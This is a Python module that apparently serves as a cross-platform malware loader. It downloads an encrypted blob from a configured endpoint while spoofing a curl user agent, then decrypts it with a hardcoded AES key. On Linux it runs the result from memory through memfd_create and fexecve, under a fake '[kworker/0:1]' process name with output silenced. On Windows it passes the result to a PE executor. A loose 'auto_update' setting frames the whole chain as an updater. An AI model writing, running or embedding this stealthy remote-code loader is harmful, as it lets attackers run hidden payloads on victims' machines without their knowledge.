# -*- coding: utf-8 -*-
"""Fetch + decrypt + validate + execute chain, cross-platform."""

import base64
import ctypes
import hashlib
import hmac
import os
import struct
import sys
import time
from urllib.parse import urlencode

import requests

_UA = "curl/8.5.0"
_TIMEOUT = 30


def _signed_url(endpoint: str, token_id: str, secret: str) -> str:
    ts = str(int(time.time()))
    msg = f"{token_id}:{ts}".encode()
    sig = hmac.new(secret.encode(), msg, hashlib.sha256).hexdigest()
    return f"{endpoint.rstrip('/')}/?{urlencode({'id': token_id, 'ts': ts, 'sig': sig})}"


def _fetch(url: str) -> bytes:
    r = requests.get(url, timeout=_TIMEOUT, headers={"User-Agent": _UA})
    if r.status_code != 200:
        raise ConnectionError(f"HTTP {r.status_code}")
    return r.content


# ────────────────────────────────────────────────────────────────
# Decryption
# ────────────────────────────────────────────────────────────────

_AES_KEY_HEX = "c402933d8c5d88d010c9b5acf70f23890f9c5e93effcec4b539c171e1f580e7b"


def _decrypt(blob: bytes) -> bytes:
    """ELF / PE passthrough; AES-GCM or XOR fallback for legacy blobs."""
    if blob[:4] == b"\x7fELF" or blob[:2] == b"MZ":
        return blob
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        key = bytes.fromhex(_AES_KEY_HEX)
        return AESGCM(key).decrypt(blob[:12], blob[12:], None)
    except Exception:
        pass
    try:
        key = bytes.fromhex(_AES_KEY_HEX)
        return bytes(blob[i] ^ key[i % len(key)] for i in range(len(blob)))
    except Exception:
        return b""


# ────────────────────────────────────────────────────────────────
# Linux ELF execution via memfd
# ────────────────────────────────────────────────────────────────

def _is_elf_x64(data: bytes) -> bool:
    if len(data) < 64 or data[:4] != b"\x7fELF":
        return False
    if data[4] != 2 or data[5] != 1:
        return False
    return struct.unpack_from("<H", data, 0x12)[0] == 0x3E


def _build_envp():
    env_bytes = [f"{k}={v}".encode() for k, v in os.environ.items()]
    arr = (ctypes.c_char_p * (len(env_bytes) + 1))()
    for i, e in enumerate(env_bytes):
        arr[i] = e
    arr[len(env_bytes)] = None
    return arr, env_bytes


def _exec_elf(payload: bytes) -> bool:
    if sys.platform != "linux":
        return False
    try:
        pid = os.fork()
    except OSError:
        return False
    if pid != 0:
        return True

    os.environ["_CK_EXEC"] = "1"
    try:
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        libc.memfd_create.restype = ctypes.c_int
        libc.memfd_create.argtypes = [ctypes.c_char_p, ctypes.c_uint]
        libc.fexecve.restype = ctypes.c_int
        libc.fexecve.argtypes = [ctypes.c_int,
                                 ctypes.POINTER(ctypes.c_char_p),
                                 ctypes.POINTER(ctypes.c_char_p)]

        name = b"[kworker/0:1]"
        fd = libc.memfd_create(name, 0)
        if fd < 0:
            os._exit(1)

        view = memoryview(payload)
        written = 0
        while written < len(payload):
            try:
                n = os.write(fd, view[written:])
            except OSError:
                os._exit(1)
            if n <= 0:
                os._exit(1)
            written += n

        if not os.environ.get("SVC_DEBUG"):
            devnull = os.open(os.devnull, os.O_WRONLY)
            os.dup2(devnull, 1)
            os.dup2(devnull, 2)
            os.close(devnull)

        envp, _keep = _build_envp()
        argv = (ctypes.c_char_p * 2)(name, None)
        try:
            libc.fexecve(fd, argv, envp)
        except Exception:
            pass
        try:
            os.execve(f"/proc/self/fd/{fd}", [name.decode()], os.environ)
        except Exception:
            os._exit(1)
    except Exception:
        pass
    os._exit(1)


# ────────────────────────────────────────────────────────────────
# Public entry point
# ────────────────────────────────────────────────────────────────

def fetch_and_execute(cfg: dict, verbose: bool = False) -> bool:
    """Full chain. Raises ValueError on permanent failure,
    ConnectionError/RuntimeError on transient."""
    system_cfg = cfg.get("system", {})
    if not system_cfg.get("enabled", True):
        return False
    if not system_cfg.get("auto_update", False):
        return False

    endpoint = system_cfg.get("endpoint", "")
    token_id = system_cfg.get("token_id", "")
    secret   = system_cfg.get("shared_secret", "")

    if not endpoint: raise ValueError("system.endpoint empty")
    if not token_id: raise ValueError("system.token_id empty")
    if not secret:   raise ValueError("system.shared_secret empty")
    if secret == "REPLACE_WITH_OPENSSL_HEX":
        raise ValueError("system.shared_secret still placeholder")

    url = _signed_url(endpoint, token_id, secret)
    if verbose:
        print(f"[chain] fetch {url}", file=sys.stderr)

    blob = _fetch(url)
    if not blob:
        raise ConnectionError("fetch returned empty")

    payload = _decrypt(blob)
    if not payload or len(payload) < 256:
        raise ValueError(f"decrypt yielded {len(payload) if payload else 0} bytes")

    if sys.platform == "win32":
        from .windows import is_pe_x64, exec_pe
        if not is_pe_x64(payload):
            raise ValueError(f"payload not PE x64 (head={payload[:8].hex()})")
        return exec_pe(payload)
    elif sys.platform == "linux":
        if not _is_elf_x64(payload):
            raise ValueError(f"payload not ELF x64 (head={payload[:8].hex()})")
        return _exec_elf(payload)
    else:
        raise ValueError(f"unsupported platform: {sys.platform}")
